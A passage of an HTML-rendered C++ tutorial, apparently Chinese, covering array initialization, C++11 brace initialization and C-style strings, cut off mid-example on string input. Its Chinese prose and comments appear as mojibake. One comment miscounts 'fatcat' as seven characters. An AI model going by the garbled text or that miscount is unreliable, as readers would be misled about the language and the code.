class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[3]: &quot;</span> &lt;&lt; data[<span class="number">3</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[4]: &quot;</span> &lt;&lt; data[<span class="number">4</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// çœç•¥å¤§å°</span></span><br><span class="line">    <span class="keyword">char</span> vowels[] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of vowels: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(vowels) / <span class="keyword">sizeof</span>(<span class="keyword">char</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–æ‰€æœ‰å…ƒç´ ä¸º 0</span></span><br><span class="line">    <span class="keyword">int</span> results[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Results[15]: &quot;</span> &lt;&lt; results[<span class="number">15</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-3-C-11æ•°ç»„åˆå§‹åŒ–æ–¹æ³•"><a href="#4-1-3-C-11æ•°ç»„åˆå§‹åŒ–æ–¹æ³•" class="headerlink" title="4.1.3 C++11æ•°ç»„åˆå§‹åŒ–æ–¹æ³•"></a>4.1.3 C++11æ•°ç»„åˆå§‹åŒ–æ–¹æ³•</h3><p>C++11 å¼•å…¥äº†æ›´ç»Ÿä¸€çš„åˆå§‹åŒ–è¯­æ³•ï¼Œç§°ä¸º<strong>åˆ—è¡¨åˆå§‹åŒ– (List Initialization)</strong> æˆ–**èŠ±æ‹¬å·åˆå§‹åŒ– (Brace Initialization)**ï¼Œå®ƒä¹Ÿå¯ä»¥ç”¨äºæ•°ç»„ã€‚</p><p><strong>ä¸»è¦å˜åŒ–:</strong></p><ol><li> <strong>å¯ä»¥çœç•¥ç­‰å· <code>=</code>:</strong> åœ¨ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨æ—¶ï¼Œå¯ä»¥çœç•¥å£°æ˜è¯­å¥ä¸­çš„ç­‰å·ã€‚</li><li> <strong>ç¦æ­¢ç¼©çª„è½¬æ¢ (Narrowing Conversion):</strong> åˆ—è¡¨åˆå§‹åŒ–ä¸å…è®¸å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±çš„â€œç¼©çª„â€è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œä¸èƒ½å°†æµ®ç‚¹æ•°ç›´æ¥åˆå§‹åŒ–ç»™æ•´å‹æ•°ç»„å…ƒç´ ï¼Œä¹Ÿä¸èƒ½å°†è¶…å‡ºèŒƒå›´çš„æ•´æ•°å€¼åˆå§‹åŒ–ç»™è¾ƒå°èŒƒå›´çš„æ•´å‹æ•°ç»„å…ƒç´ ã€‚</li></ol><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[arraySize] &#123;<span class="built_in">initializer_list</span>&#125;; <span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ– (å¯çœç•¥ç­‰å·)</span></span><br><span class="line">typeName arrayName[] &#123;<span class="built_in">initializer_list</span>&#125;;         <span class="comment">// çœç•¥å¤§å°</span></span><br></pre></td></tr></table></figure><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ– (çœç•¥ç­‰å·)</span></span><br><span class="line">    <span class="keyword">int</span> scores[<span class="number">5</span>] &#123;<span class="number">90</span>, <span class="number">85</span>, <span class="number">92</span>, <span class="number">78</span>, <span class="number">88</span>&#125;; </span><br><span class="line">    <span class="keyword">double</span> lengths[<span class="number">3</span>] &#123;<span class="number">1.2</span>, <span class="number">3.4</span>, <span class="number">0.5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> counts[<span class="number">10</span>] &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// éƒ¨åˆ†åˆå§‹åŒ–ï¼Œå‰©ä½™å…ƒç´ ä¸º 0</span></span><br><span class="line">    <span class="keyword">int</span> allZeros[<span class="number">100</span>] &#123;&#125;;     <span class="comment">// æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸º 0 (ç©ºåˆ—è¡¨)</span></span><br><span class="line">    <span class="keyword">short</span> values[] &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;; <span class="comment">// çœç•¥å¤§å°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scores[1]: &quot;</span> &lt;&lt; scores[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 85</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counts[5]: &quot;</span> &lt;&lt; counts[<span class="number">5</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;allZeros[50]: &quot;</span> &lt;&lt; allZeros[<span class="number">50</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of values: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(values) / <span class="keyword">sizeof</span>(<span class="keyword">short</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¦æ­¢ç¼©çª„è½¬æ¢ç¤ºä¾‹</span></span><br><span class="line">    <span class="comment">// int errors[3] &#123;1, 2, 3.0&#125;; // é”™è¯¯! double (3.0) åˆ° int æ˜¯ç¼©çª„è½¬æ¢</span></span><br><span class="line">    <span class="comment">// char chars[2] &#123; &#x27;a&#x27;, 300 &#125;; // é”™è¯¯! 300 è¶…å‡º char çš„èŒƒå›´ (å‡è®¾ char æ˜¯ 8 ä½)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å…è®¸éç¼©çª„è½¬æ¢</span></span><br><span class="line">    <span class="keyword">char</span> chars_ok[<span class="number">3</span>] &#123; <span class="string">&#x27;a&#x27;</span>, <span class="number">66</span>, <span class="string">&#x27;c&#x27;</span> &#125;; <span class="comment">// 66 åœ¨ char èŒƒå›´å†…ï¼Œå¯ä»¥éšå¼è½¬æ¢ä¸º &#x27;B&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Chars OK: &quot;</span> &lt;&lt; chars_ok[<span class="number">0</span>] &lt;&lt; chars_ok[<span class="number">1</span>] &lt;&lt; chars_ok[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º aBc</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å»ºè®®:</strong> C++11 çš„åˆ—è¡¨åˆå§‹åŒ–æä¾›äº†æ›´ä¸€è‡´ã€æ›´å®‰å…¨çš„åˆå§‹åŒ–æ–¹å¼ï¼Œæ¨èåœ¨æ”¯æŒ C++11 åŠæ›´é«˜æ ‡å‡†çš„é¡¹ç›®ä¸­ä½¿ç”¨ã€‚ç‰¹åˆ«æ˜¯ <code>typeName arrayName[size] &#123;&#125;;</code> è¿™ç§å°†æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸ºé›¶å€¼çš„å½¢å¼éå¸¸æ–¹ä¾¿ã€‚</p><h2 id="4-2-å­—ç¬¦ä¸²"><a href="#4-2-å­—ç¬¦ä¸²" class="headerlink" title="4.2 å­—ç¬¦ä¸²"></a>4.2 å­—ç¬¦ä¸²</h2><p>å­—ç¬¦ä¸²æ˜¯ç¨‹åºä¸­ç”¨äºè¡¨ç¤ºæ–‡æœ¬ä¿¡æ¯çš„é‡è¦æ•°æ®ç±»å‹ã€‚C++å¤„ç†å­—ç¬¦ä¸²æœ‰ä¸¤ç§ä¸»è¦æ–¹å¼ï¼š</p><ol><li> <strong>Cé£æ ¼å­—ç¬¦ä¸² (C-Style String):</strong> è¿™æ˜¯ç»§æ‰¿è‡ªCè¯­è¨€çš„æ–¹å¼ï¼Œå°†å­—ç¬¦ä¸²è§†ä¸ºå­˜å‚¨åœ¨ <code>char</code> æ•°ç»„ä¸­å¹¶ä»¥<strong>ç©ºå­—ç¬¦ (<code>\0</code>)</strong> ç»“å°¾çš„å­—ç¬¦åºåˆ—ã€‚</li><li> <strong><code>string</code> ç±»:</strong> C++æ ‡å‡†åº“æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„ <code>string</code> ç±»ï¼Œæä¾›äº†æ›´æ–¹ä¾¿ã€æ›´å®‰å…¨çš„å­—ç¬¦ä¸²æ“ä½œï¼ˆå°†åœ¨ 4.3 èŠ‚ä»‹ç»ï¼‰ã€‚</li></ol><p>æœ¬èŠ‚ä¸»è¦å…³æ³¨ C é£æ ¼å­—ç¬¦ä¸²ã€‚</p><p><strong>å­—ç¬¦ä¸²å­—é¢å€¼ (String Literal) æˆ–å­—ç¬¦ä¸²å¸¸é‡ (String Constant):</strong><br>åœ¨ä»£ç ä¸­ç”¨åŒå¼•å· <code>&quot;&quot;</code> æ‹¬èµ·æ¥çš„å­—ç¬¦åºåˆ—ï¼Œä¾‹å¦‚ <code>&quot;Hello, world!&quot;</code>, <code>&quot;C++&quot;</code>, <code>&quot;&quot;</code> (ç©ºå­—ç¬¦ä¸²)ã€‚å®ƒä»¬å­˜å‚¨åœ¨å†…å­˜çš„åªè¯»åŒºåŸŸã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åœ¨å­—ç¬¦ä¸²å­—é¢å€¼çš„æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ <code>\0</code>ã€‚</p><h3 id="4-2-1-æ‹¼æ¥å­—ç¬¦ä¸²å¸¸é‡"><a href="#4-2-1-æ‹¼æ¥å­—ç¬¦ä¸²å¸¸é‡" class="headerlink" title="4.2.1 æ‹¼æ¥å­—ç¬¦ä¸²å¸¸é‡"></a>4.2.1 æ‹¼æ¥å­—ç¬¦ä¸²å¸¸é‡</h3><p>C++å…è®¸å°†<strong>ç›¸é‚»</strong>çš„å­—ç¬¦ä¸²å­—é¢å€¼è‡ªåŠ¨æ‹¼æ¥ï¼ˆè¿æ¥ï¼‰æˆä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦ä¸²ã€‚è¿™å¯¹äºå°†è¾ƒé•¿çš„å­—ç¬¦ä¸²åˆ†æˆå¤šè¡Œä¹¦å†™éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ç›¸é‚»çš„å­—ç¬¦ä¸²å­—é¢å€¼ä¼šè¢«è‡ªåŠ¨æ‹¼æ¥</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is the first part, &quot;</span> <span class="string">&quot;and this is the second part.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// è¾“å‡º: This is the first part, and this is the second part.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥è·¨è¶Šå¤šè¡Œ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1: Some text...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Line 2: More text...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Line 3: Final line.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    è¾“å‡º:</span></span><br><span class="line"><span class="comment">    Line 1: Some text...</span></span><br><span class="line"><span class="comment">    Line 2: More text...</span></span><br><span class="line"><span class="comment">    Line 3: Final line.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‹¼æ¥ç»“æœæ˜¯ä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦ä¸²å¸¸é‡</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* long_message = <span class="string">&quot;Part 1. &quot;</span></span><br><span class="line">                               <span class="string">&quot;Part 2. &quot;</span></span><br><span class="line">                               <span class="string">&quot;Part 3.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; long_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// è¾“å‡º: Part 1. Part 2. Part 3.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šå˜é‡å’Œå­—ç¬¦ä¸²å­—é¢å€¼ä¸èƒ½è‡ªåŠ¨æ‹¼æ¥</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> part1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; part1 &quot; world!&quot;; // é”™è¯¯! ä¸èƒ½è¿™æ ·æ‹¼æ¥å˜é‡å’Œå­—é¢å€¼</span></span><br><span class="line">    <span class="comment">// éœ€è¦ä½¿ç”¨ string ç±»çš„æ‹¼æ¥æ“ä½œ (è§ 4.3 èŠ‚) æˆ– cout çš„é“¾å¼è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; part1 &lt;&lt; <span class="string">&quot; world!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æ­£ç¡®</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-2-åœ¨æ•°ç»„ä¸­ä½¿ç”¨å­—ç¬¦ä¸²"><a href="#4-2-2-åœ¨æ•°ç»„ä¸­ä½¿ç”¨å­—ç¬¦ä¸²" class="headerlink" title="4.2.2 åœ¨æ•°ç»„ä¸­ä½¿ç”¨å­—ç¬¦ä¸²"></a>4.2.2 åœ¨æ•°ç»„ä¸­ä½¿ç”¨å­—ç¬¦ä¸²</h3><p>Cé£æ ¼å­—ç¬¦ä¸²æœ¬è´¨ä¸Šæ˜¯ <code>char</code> ç±»å‹çš„æ•°ç»„ï¼Œå…¶ç‰¹æ®Šä¹‹å¤„åœ¨äºæœ€åä¸€ä¸ªå­—ç¬¦å¿…é¡»æ˜¯**ç©ºå­—ç¬¦ (<code>\0</code>)**ã€‚è¿™ä¸ªç©ºå­—ç¬¦æ ‡è®°äº†å­—ç¬¦ä¸²çš„å®é™…ç»“æŸä½ç½®ã€‚</p><p><strong>å£°æ˜å’Œåˆå§‹åŒ–:</strong></p><p>å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢å€¼æ¥åˆå§‹åŒ– <code>char</code> æ•°ç»„ã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è®¡ç®—å¤§å°ï¼ˆåŒ…æ‹¬æœ«å°¾çš„ <code>\0</code>ï¼‰å¹¶å°†å…¶å¤åˆ¶åˆ°æ•°ç»„ä¸­ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // åŒ…å« C é£æ ¼å­—ç¬¦ä¸²å‡½æ•°åº“ (ä¾‹å¦‚ strlen)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ– char æ•°ç»„</span></span><br><span class="line">    <span class="keyword">char</span> dog[<span class="number">8</span>] = <span class="string">&quot;fatcat&quot;</span>; <span class="comment">// æ•°ç»„å¤§å°å¿…é¡»è¶³å¤Ÿå®¹çº³å­—ç¬¦ä¸² + ç©ºå­—ç¬¦ (&#x27;f&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\0&#x27;)</span></span><br><span class="line">                            <span class="comment">// dog æ•°ç»„å¤§å°ä¸º 8ï¼Œå®é™…ä½¿ç”¨ 7 ä¸ªå­—ç¬¦ + 1 ä¸ªç©ºå­—ç¬¦</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> bird[] = <span class="string">&quot;wren&quot;</span>;   <span class="comment">// ç¼–è¯‘å™¨è‡ªåŠ¨æ¨æ–­å¤§å°ä¸º 5 (&#x27;w&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;n&#x27;,&#x27;\0&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨åˆ—è¡¨åˆå§‹åŒ– (éœ€è¦æ˜¾å¼åŒ…å«ç©ºå­—ç¬¦)</span></span><br><span class="line">    <span class="keyword">char</span> fish[] = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯ç¤ºä¾‹ï¼šæ•°ç»„å¤§å°ä¸è¶³</span></span><br><span class="line">    <span class="comment">// char cat[3] = &quot;cat&quot;; // é”™è¯¯! éœ€è¦å¤§å° 4 æ¥å­˜å‚¨ &#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dog: &quot;</span> &lt;&lt; dog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// cout é‡åˆ°ç©ºå­—ç¬¦åœæ­¢è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bird: &quot;</span> &lt;&lt; bird &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fish: &quot;</span> &lt;&lt; fish &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å•ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Third letter of dog: &quot;</span> &lt;&lt; dog[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &#x27;t&#x27;</span></span><br><span class="line">    dog[<span class="number">0</span>] = <span class="string">&#x27;p&#x27;</span>; <span class="comment">// å¯ä»¥ä¿®æ”¹æ•°ç»„å†…å®¹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified dog: &quot;</span> &lt;&lt; dog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;patcat&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// strlen() å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ (ä¸åŒ…æ‹¬ç©ºå­—ç¬¦)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of dog: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">strlen</span>(dog) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 6 (å› ä¸ºç°åœ¨æ˜¯ &quot;patcat&quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of bird: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">strlen</span>(bird) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// sizeof() è®¡ç®—æ•´ä¸ªæ•°ç»„å ç”¨çš„å†…å­˜å¤§å° (åŒ…æ‹¬ç©ºå­—ç¬¦å’Œæœªä½¿ç”¨çš„ç©ºé—´)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of dog array: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(dog) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of bird array: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(bird) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹:</strong></p><ul><li>  å­˜å‚¨ C é£æ ¼å­—ç¬¦ä¸²çš„ <code>char</code> æ•°ç»„å¤§å°å¿…é¡»è‡³å°‘æ˜¯å­—ç¬¦ä¸²é•¿åº¦åŠ  1ï¼ˆä¸º <code>\0</code> ç•™å‡ºç©ºé—´ï¼‰ã€‚</li><li>  å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ–ä¼šè‡ªåŠ¨æ·»åŠ  <code>\0</code>ã€‚</li><li>  åˆ—è¡¨åˆå§‹åŒ–éœ€è¦æ‰‹åŠ¨æ·»åŠ  <code>\0</code>ã€‚</li><li>  <code>strlen()</code> è®¡ç®—çš„æ˜¯åˆ° <code>\0</code> ä¸ºæ­¢çš„å­—ç¬¦æ•°ã€‚</li><li>  <code>sizeof()</code> è®¡ç®—çš„æ˜¯æ•´ä¸ªæ•°ç»„çš„å­—èŠ‚å¤§å°ã€‚</li></ul><h3 id="4-2-3-å­—ç¬¦ä¸²è¾“å…¥"><a href="#4-2-3-å­—ç¬¦ä¸²è¾“å…¥" class="headerlink" title="4.2.3 å­—ç¬¦ä¸²è¾“å…¥"></a>4.2.3 å­—ç¬¦ä¸²è¾“å…¥</h3><p>ä½¿ç”¨ <code>cin</code> å’Œ <code>&gt;&gt;</code> è¿ç®—ç¬¦è¯»å– C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­˜å‚¨åœ¨ <code>char</code> æ•°ç»„ä¸­ï¼‰æ—¶ï¼Œå­˜åœ¨ä¸€ä¸ªä¸»è¦é™åˆ¶ï¼š<code>cin</code> é»˜è®¤ä»¥<strong>ç©ºç™½å­—ç¬¦</strong>ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ä½œä¸ºè¾“å…¥çš„åˆ†éš”ç¬¦ã€‚è¿™æ„å‘³ç€ <code>cin &gt;&gt;</code> åªä¼šè¯»å–åˆ°ç¬¬ä¸€ä¸ªç©ºç™½å­—ç¬¦ä¹‹å‰çš„éƒ¨åˆ†ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> name[SIZE];</span><br><span class="line">    <span class="keyword">char</span> dessert[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your first name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; name; <span class="comment">// è¯»å–ç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªç©ºç™½å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your favorite dessert: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; dessert; <span class="comment">// 